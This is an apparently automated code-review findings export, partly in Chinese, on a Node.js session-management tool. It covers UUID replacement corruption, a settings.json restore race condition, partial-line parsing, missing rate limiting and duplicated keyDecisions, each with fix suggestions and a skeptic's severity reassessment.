verified_findings.canonical_description: UUID 映射替换逻辑对每个旧 UUID 依次执行 `newContent.split(oldUuid).join(newUuid)`，但未处理 UUID 间的子串关系。虽然 UUID 发生子串碰撞概率极低，但 JSONL 文件中 UUID 会出现在 JSON 字符串值（如 tool_use 的 input 字段）中。更致命的是：文本内容（如 AI 回复中包含调试输出的 UUID）中的 UUID 也会被替换，导致会话记录被静默损坏。此外，同一个旧 UUID 的不同大小写出现被分别替换为相同的 newUuid，这本身逻辑正确，但 `Object.keys(uuidMap)` 的顺序是不确定的（V8 中通常按插入顺序但 ES 规范不保证），可能导致跨运行的替换结果不一致。

sources.title: UUID 级联替换可能导致内容损坏
sources.description: UUID 映射替换逻辑对每个旧 UUID 依次执行 `newContent.split(oldUuid).join(newUuid)`，但未处理 UUID 间的子串关系。虽然 UUID 发生子串碰撞概率极低，但 JSONL 文件中 UUID 会出现在 JSON 字符串值（如 tool_use 的 input 字段）中。更致命的是：文本内容（如 AI 回复中包含调试输出的 UUID）中的 UUID 也会被替换，导致会话记录被静默损坏。此外，同一个旧 UUID 的不同大小写出现被分别替换为相同的 newUuid，这本身逻辑正确，但 `Object.keys(uuidMap)` 的顺序是不确定的（V8 中通常按插入顺序但 ES 规范不保证），可能导致跨运行的替换结果不一致。
sources.rule_reference: Correctness of string replacement in structured data

verified_findings.suggestion: 仅在 JSON 结构字段中替换 UUID（如 sessionId, parentSessionId 等已知字段），而非全文盲替。或者在替换前对 UUID 按长度降序排序，先替换长的 UUID 避免子串问题。对 JSON 值中出现的不在映射表中的 UUID，不应替换而是生成新的映射。
verified_findings.skeptic_rationale: The referenced code (index.js lines 95-115) is NOT present in the provided source code context. The finding describes UUID cascade replacement that could corrupt content if a UUID is a substring of another UUID. This is a real algorithmic concern (e.g., replacing 'abc' before 'abcd' would corrupt 'abcd' → 'Xcd' instead of 'XY'). However, without seeing the actual replacement code, the UUID mapping table, or the replacement order, I cannot verify whether this is practically exploitable or if existing safeguards (like sorting by length) are already in place.

verified_findings.canonical_title: Race condition: settings.json restore timer fires after 5s regardless of concurrent swaps
verified_findings.canonical_description: launchSessionDirect swaps settings.json to the target config, then sets a 5-second timeout to restore the original settings. If a second launchSessionDirect or launchTerminalBat is called within that 5-second window, the restore from the first call will overwrite the settings that the second call just set. Additionally, if the VSCode extension reads settings.json after the 5-second restore, it will see the wrong configuration. There is no coordination between concurrent calls — no queue, no reference counting, and no cancellation of pending timers.

sources.title: Race condition: settings.json restore timer fires after 5s regardless of concurrent swaps
sources.description: launchSessionDirect swaps settings.json to the target config, then sets a 5-second timeout to restore the original settings. If a second launchSessionDirect or launchTerminalBat is called within that 5-second window, the restore from the first call will overwrite the settings that the second call just set. Additionally, if the VSCode extension reads settings.json after the 5-second restore, it will see the wrong configuration. There is no coordination between concurrent calls — no queue, no reference counting, and no cancellation of pending timers.
sources.rule_reference: CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization

verified_findings.suggestion: Implement a proper settings swap manager: use a single shared variable to track the pending restore timeout (cancel and restart on each new swap), or use a reference-counting approach where settings.json is only restored when all active sessions using the swapped config have completed. At minimum, clear the previous timeout before setting a new one, extending the window rather than creating conflicting restores.
verified_findings.skeptic_rationale: Same root cause as M-002 — the 5-second setTimeout for settings.json restore. Duplicate finding. The timer-based restore fires regardless of whether another swap is active. Refers to the same swapSettingsJson mechanism. Same verdict as M-002: real race condition, functional bug, not security vulnerability. Downgrade from P1 to P2.

verified_findings.canonical_title: parseSessionChunk tail-offset may produce corrupted first line when reading partial content
verified_findings.canonical_description: When reading a chunk starting from an offset (incremental scan), the function seeks to startOffset bytes into the file. However, the offset points to the byte after the last complete line. If the file is modified in a way that the byte at startOffset is mid-line (e.g., the file was truncated and then appended, or the offset tracking was wrong), the first line read will be a partial/corrupted JSON line. The code at lines 109-114 attempt to skip the first line if 'tailBytes < fsize' (which is always true when startOffset > 0 unless the file is empty), but this check is from a different code path (session detail handler, line 52-60 of session.js) — it's not present in parseSessionChunk itself. parseSessionChunk just splits lines starting from startOffset and tries to parse each one, potentially producing garbage data or missing the first partial line.

sources.title: parseSessionChunk tail-offset may produce corrupted first line when reading partial content
sources.description: When reading a chunk starting from an offset (incremental scan), the function seeks to startOffset bytes into the file. However, the offset points to the byte after the last complete line. If the file is modified in a way that the byte at startOffset is mid-line (e.g., the file was truncated and then appended, or the offset tracking was wrong), the first line read will be a partial/corrupted JSON line. The code at lines 109-114 attempt to skip the first line if 'tailBytes < fsize' (which is always true when startOffset > 0 unless the file is empty), but this check is from a different code path (session detail handler, line 52-60 of session.js) — it's not present in parseSessionChunk itself. parseSessionChunk just splits lines starting from startOffset and tries to parse each one, potentially producing garbage data or missing the first partial line.
sources.rule_reference: N/A — correctness bug in incremental file parsing

verified_findings.suggestion: After reading from startOffset, scan forward to the next newline character before beginning line-by-line parsing. This ensures the parser always starts at a line boundary. Also consider using a persistent fd or checking the mtime to detect truncation.
verified_findings.skeptic_rationale: The tail-read in parseSessionChunk starts at a byte offset that may fall mid-line or mid-UTF-8-character. However, examining the caller buildSessionDetailResponse: 'if (tailBytes < fsize && lines.length > 1) lines.shift()' — the first (potentially corrupt) line is explicitly removed. The JSON.parse try/catch in parseLine also silently skips unparseable lines. So there are TWO mitigations already in place: (1) lines.shift() removes partial first line, (2) parseLine catches and ignores parse errors. The corruption risk is effectively zero in practice. Downgrade from P1 to P3.

verified_findings.canonical_title: No rate limiting on any endpoint — trivial DoS via repeated heavy requests
verified_findings.canonical_description: The server has no rate limiting, request throttling, or timeout enforcement on any endpoint. An attacker (or a malfunctioning client) can: (1) repeatedly call /api/create-and-open to exhaust disk space by creating session files, (2) call /api/session/*?full=1 to force the server to read and parse entire large JSONL files into memory repeatedly, (3) open unlimited SSE connections (capped at 50, but 50 concurrent long-lived connections still consume resources). The snapshot auto-cleanup caps at 30 auto-snapshots, but manual snapshots have no limit.

sources.title: No rate limiting on any endpoint — trivial DoS via repeated heavy requests
sources.description: The server has no rate limiting, request throttling, or timeout enforcement on any endpoint. An attacker (or a malfunctioning client) can: (1) repeatedly call /api/create-and-open to exhaust disk space by creating session files, (2) call /api/session/*?full=1 to force the server to read and parse entire large JSONL files into memory repeatedly, (3) open unlimited SSE connections (capped at 50, but 50 concurrent long-lived connections still consume resources). The snapshot auto-cleanup caps at 30 auto-snapshots, but manual snapshots have no limit.
sources.rule_reference: CWE-770: Allocation of Resources Without Limits or Throttling

verified_findings.suggestion: Implement per-endpoint rate limiting (e.g., 10 req/s for read endpoints, 1 req/s for write endpoints). Add a maximum request body size. Add a timeout for session detail parsing (limit the number of lines parsed). Cap the total number of manual snapshots.

verified_findings.canonical_title: Single session API uses keyDecisions from cache without per-request deduplication
verified_findings.canonical_description: The session detail response at line 87 returns cached.keyDecisions directly. Since keyDecisions are append-only in mergeSessionData (scanner.js line 227-231), repeated API calls for the same session will show growing duplicate decision lists as the cache accumulates data across incremental scans. The decisions array could contain the same tool calls multiple times if mergeSessionData is called with overlapping delta ranges. In the waterfall/relations view for the same session, no deduplication is performed at all.

sources.title: Single session API uses keyDecisions from cache without per-request deduplication
sources.description: The session detail response at line 87 returns cached.keyDecisions directly. Since keyDecisions are append-only in mergeSessionData (scanner.js line 227-231), repeated API calls for the same session will show growing duplicate decision lists as the cache accumulates data across incremental scans. The decisions array could contain the same tool calls multiple times if mergeSessionData is called with overlapping delta ranges. In the waterfall/relations view for the same session, no deduplication is performed at all.
sources.rule_reference: N/A — data correctness bug

verified_findings.suggestion: Deduplicate keyDecisions before returning them in the API response (by timestamp + tool name), or use a Set-like structure for tool call tracking during parsing. At minimum, cap the array size before serializing to JSON.
verified_findings.skeptic_rationale: The finding claims keyDecisions may contain duplicates. Looking at the code: keyDecisions comes from the cached session object and is returned directly in the API response. Whether duplicates exist depends on how keyDecisions is populated during scanning (scanner.js). However: (1) Duplicate keyDecisions is a data display quality issue, not a security vulnerability. (2) The array size is bounded by the number of tool calls in a session. (3) The API response already includes the full message list — keyDecisions is a convenience summary. (4) JSON serialization of a slightly larger array has negligible performance impact. This is a P3 data quality nit, not a P1 CRITICAL finding.
